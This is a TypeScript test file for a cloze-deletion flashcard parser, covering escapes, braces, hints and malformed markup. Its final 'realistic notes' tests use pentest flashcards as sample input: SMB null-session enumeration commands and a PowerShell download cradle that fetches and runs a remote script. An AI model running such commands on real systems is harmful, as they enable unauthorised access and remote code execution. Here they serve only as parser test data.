import { describe, expect, it } from 'vitest';
import {
  clozeOrdinals,
  escapeCloze,
  nextOrdinal,
  parseCloze,
  summarize,
  unescapeCloze,
} from './parse';
import type { ClozeNode, Node } from './types';

const clozes = (nodes: Node[]): ClozeNode[] => nodes.filter((n): n is ClozeNode => n.kind === 'cloze');
const texts = (nodes: Node[]): string[] => nodes.filter((n) => n.kind === 'text').map((n) => n.text);
const codes = (src: string) => parseCloze(src).diagnostics.map((d) => d.code);

// ---------------------------------------------------------------------------
// The basic grammar
// ---------------------------------------------------------------------------

describe('basic grammar', () => {
  it('parses a single deletion', () => {
    const { nodes, ordinals } = parseCloze('The capital is {{c1::Paris}}.');
    expect(ordinals).toEqual([1]);
    expect(clozes(nodes)).toEqual([
      { kind: 'cloze', ordinal: 1, answer: 'Paris', start: 15, end: 28 },
    ]);
    expect(texts(nodes)).toEqual(['The capital is ', '.']);
  });

  it('parses a hint', () => {
    const [node] = clozes(parseCloze('{{c1::Paris::a city}}').nodes);
    expect(node.answer).toBe('Paris');
    expect(node.hint).toBe('a city');
  });

  it('treats an empty hint as no hint for rendering purposes', () => {
    const [node] = clozes(parseCloze('{{c1::Paris::}}').nodes);
    expect(node.answer).toBe('Paris');
    expect(node.hint).toBe('');
  });

  it('parses several deletions', () => {
    expect(clozeOrdinals('{{c1::a}} {{c2::b}} {{c3::c}}')).toEqual([1, 2, 3]);
  });

  it('reports a repeated ordinal once but keeps both nodes', () => {
    const { nodes, ordinals } = parseCloze('{{c1::a}} and {{c1::b}}');
    expect(ordinals).toEqual([1]);
    expect(clozes(nodes)).toHaveLength(2);
  });

  it('sorts ordinals numerically, not lexically', () => {
    expect(clozeOrdinals('{{c10::a}} {{c2::b}} {{c1::c}}')).toEqual([1, 2, 10]);
  });

  it('handles a deletion at the very start and end', () => {
    const { nodes } = parseCloze('{{c1::a}}{{c2::b}}');
    expect(clozes(nodes)).toHaveLength(2);
    expect(texts(nodes)).toEqual([]);
  });

  it('records source offsets that slice back to the original markup', () => {
    const src = 'x {{c1::Paris::hint}} y';
    const [node] = clozes(parseCloze(src).nodes);
    expect(src.slice(node.start, node.end)).toBe('{{c1::Paris::hint}}');
  });
});

// ---------------------------------------------------------------------------
// `::` inside the answer — the case that matters most for technical decks
// ---------------------------------------------------------------------------

describe(':: inside the answer', () => {
  it('follows Anki and treats the first :: as the hint separator', () => {
    // Documented behaviour, not an accident: this is why escaping exists.
    const [node] = clozes(parseCloze('{{c1::std::vector}}').nodes);
    expect(node.answer).toBe('std');
    expect(node.hint).toBe('vector');
  });

  it('keeps later :: inside the hint', () => {
    const [node] = clozes(parseCloze('{{c1::a::b::c}}').nodes);
    expect(node.answer).toBe('a');
    expect(node.hint).toBe('b::c');
  });

  it('escaping :: keeps a qualified name in one piece', () => {
    const [node] = clozes(parseCloze('{{c1::[Net.WebClient]\\:\\:DownloadString}}').nodes);
    expect(node.answer).toBe('[Net.WebClient]::DownloadString');
    expect(node.hint).toBeUndefined();
  });

  it('escaping :: works alongside a real hint', () => {
    const [node] = clozes(parseCloze('{{c1::std\\:\\:vector::a container}}').nodes);
    expect(node.answer).toBe('std::vector');
    expect(node.hint).toBe('a container');
  });

  it('leaves a lone colon alone', () => {
    const [node] = clozes(parseCloze('{{c1::Note: this}}').nodes);
    expect(node.answer).toBe('Note: this');
    expect(node.hint).toBeUndefined();
  });

  it('handles an IPv6 loopback address', () => {
    const [node] = clozes(parseCloze('Loopback is {{c1::\\:\\:1}}').nodes);
    expect(node.answer).toBe('::1');
  });
});

// ---------------------------------------------------------------------------
// Braces — LaTeX and friends
// ---------------------------------------------------------------------------

describe('braces inside the answer', () => {
  it('does not close early on a LaTeX fraction', () => {
    // A naive /\{\{c(\d+)::(.*?)\}\}/ closes at the "}}" ending {2}, which is
    // the single most likely way to get a silently mangled card.
    const [node] = clozes(parseCloze('{{c1::\\frac{1}{2}}}').nodes);
    expect(node.answer).toBe('\\frac{1}{2}');
    expect(node.hint).toBeUndefined();
  });

  it('handles nested balanced braces', () => {
    const [node] = clozes(parseCloze('{{c1::a{b{c}d}e}}').nodes);
    expect(node.answer).toBe('a{b{c}d}e');
  });

  it('keeps text after a brace-heavy deletion', () => {
    const { nodes } = parseCloze('{{c1::\\frac{1}{2}}} of the total');
    expect(texts(nodes)).toEqual([' of the total']);
  });

  it('handles two brace-heavy deletions in one note', () => {
    const found = clozes(parseCloze('{{c1::{a}}} and {{c2::{b}}}').nodes);
    expect(found.map((n) => n.answer)).toEqual(['{a}', '{b}']);
  });

  it('accepts escaped braces as literals', () => {
    const [node] = clozes(parseCloze('{{c1::a\\{b}}').nodes);
    expect(node.answer).toBe('a{b');
  });

  it('flags braces that cannot balance', () => {
    expect(codes('{{c1::a}b}}')).toContain('unbalanced-braces');
  });
});

// ---------------------------------------------------------------------------
// Malformed input
// ---------------------------------------------------------------------------

describe('malformed markup', () => {
  it('reports an unclosed deletion and keeps the text literal', () => {
    const { ordinals, diagnostics } = parseCloze('The answer is {{c1::Paris');
    expect(ordinals).toEqual([]);
    expect(diagnostics[0]).toMatchObject({ severity: 'error', code: 'unclosed-cloze' });
  });

  it('does not throw on any prefix of valid markup', () => {
    const full = 'x {{c1::Paris::hint}} y {{c2::\\frac{1}{2}}} z';
    for (let i = 0; i <= full.length; i++) {
      expect(() => parseCloze(full.slice(0, i))).not.toThrow();
    }
  });

  it('rejects nesting rather than guessing', () => {
    const { ordinals, diagnostics } = parseCloze('{{c1::a {{c2::b}} c}}');
    expect(diagnostics[0]).toMatchObject({ severity: 'error', code: 'nested-cloze' });
    expect(ordinals).toEqual([]);
  });

  it('keeps a nested span as literal text so the author can see it', () => {
    const { nodes } = parseCloze('{{c1::a {{c2::b}} c}}');
    expect(texts(nodes).join('')).toBe('{{c1::a {{c2::b}} c}}');
  });

  it('warns about c0 and generates no card for it', () => {
    const { ordinals } = parseCloze('{{c0::a}} {{c1::b}}');
    expect(ordinals).toEqual([1]);
    expect(codes('{{c0::a}}')).toContain('invalid-ordinal');
  });

  it('warns about an empty answer but still makes the card', () => {
    const { ordinals } = parseCloze('{{c1::}}');
    expect(ordinals).toEqual([1]);
    expect(codes('{{c1::}}')).toContain('empty-answer');
  });

  it('warns when a note has no deletions at all', () => {
    expect(codes('just some prose')).toEqual(['no-cloze']);
  });

  it('does not add "no deletions" noise on top of a parse error', () => {
    expect(codes('{{c1::a')).toEqual(['unclosed-cloze']);
    expect(codes('{{c1::a {{c2::b}} c}}')).toEqual(['nested-cloze']);
  });

  it('says nothing about empty input', () => {
    expect(parseCloze('').diagnostics).toEqual([]);
    expect(parseCloze('   ').diagnostics).toEqual([]);
  });

  it('leaves non-cloze double braces as text', () => {
    const { ordinals, nodes } = parseCloze('A template uses {{name}} syntax.');
    expect(ordinals).toEqual([]);
    expect(texts(nodes).join('')).toBe('A template uses {{name}} syntax.');
  });

  it('ignores an uppercase C, which is not the syntax', () => {
    expect(clozeOrdinals('{{C1::a}}')).toEqual([]);
  });

  it('ignores a missing double colon', () => {
    expect(clozeOrdinals('{{c1:a}}')).toEqual([]);
  });

  it('recovers and parses later deletions after a bad ordinal', () => {
    expect(clozeOrdinals('{{c0::x}} then {{c2::y}}')).toEqual([2]);
  });
});

// ---------------------------------------------------------------------------
// Escapes
// ---------------------------------------------------------------------------

describe('escapes', () => {
  it('round-trips through escape and unescape', () => {
    for (const s of ['a::b', '{braces}', 'back\\slash', 'C:\\Windows\\System32', '::1', '']) {
      expect(unescapeCloze(escapeCloze(s))).toBe(s);
    }
  });

  it('leaves a backslash before an ordinary character alone', () => {
    expect(unescapeCloze('\\frac')).toBe('\\frac');
  });

  it('unescapes a doubled backslash to one', () => {
    expect(unescapeCloze('a\\\\b')).toBe('a\\b');
  });

  it('does not let an escaped brace open or close a deletion', () => {
    const [node] = clozes(parseCloze('{{c1::a\\}b}}').nodes);
    expect(node.answer).toBe('a}b');
  });

  it('does not let an escaped brace start markup in body text', () => {
    expect(clozeOrdinals('\\{\\{c1::a}}')).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

describe('nextOrdinal', () => {
  it('starts at 1 for an empty note', () => {
    expect(nextOrdinal('')).toBe(1);
  });

  it('appends after a contiguous run', () => {
    expect(nextOrdinal('{{c1::a}} {{c2::b}}')).toBe(3);
  });

  it('fills a gap rather than always appending', () => {
    expect(nextOrdinal('{{c1::a}} {{c3::c}}')).toBe(2);
  });
});

describe('summarize', () => {
  it('counts cards and reports no error for clean input', () => {
    const s = summarize('{{c1::a}} {{c2::b}}');
    expect(s.cardCount).toBe(2);
    expect(s.hasError).toBe(false);
  });

  it('flags an error that would produce a wrong card', () => {
    expect(summarize('{{c1::a {{c2::b}} c}}').hasError).toBe(true);
  });

  it('does not treat a warning as an error', () => {
    const s = summarize('{{c1::}}');
    expect(s.diagnostics).toHaveLength(1);
    expect(s.hasError).toBe(false);
  });
});

// ---------------------------------------------------------------------------
// Realistic notes
// ---------------------------------------------------------------------------

describe('realistic notes', () => {
  it('handles a multi-line note with mixed markup', () => {
    const src = [
      'SMB enumeration:',
      '- {{c1::smbclient -L //target/ -N}} lists shares anonymously',
      '- {{c2::rpcclient -U "" -N target}} opens a null session',
      '- Use {{c3::enum4linux-ng::modern rewrite}} for a sweep',
    ].join('\n');

    const { ordinals, diagnostics } = parseCloze(src);
    expect(ordinals).toEqual([1, 2, 3]);
    expect(diagnostics).toEqual([]);
  });

  it('handles a PowerShell download cradle with escaped qualifiers', () => {
    const src =
      'Cradle: {{c1::IEX(New-Object Net.WebClient).DownloadString(\'http://host/a.ps1\')}}';
    const [node] = clozes(parseCloze(src).nodes);
    expect(node.answer).toBe("IEX(New-Object Net.WebClient).DownloadString('http://host/a.ps1')");
    expect(parseCloze(src).diagnostics).toEqual([]);
  });
});
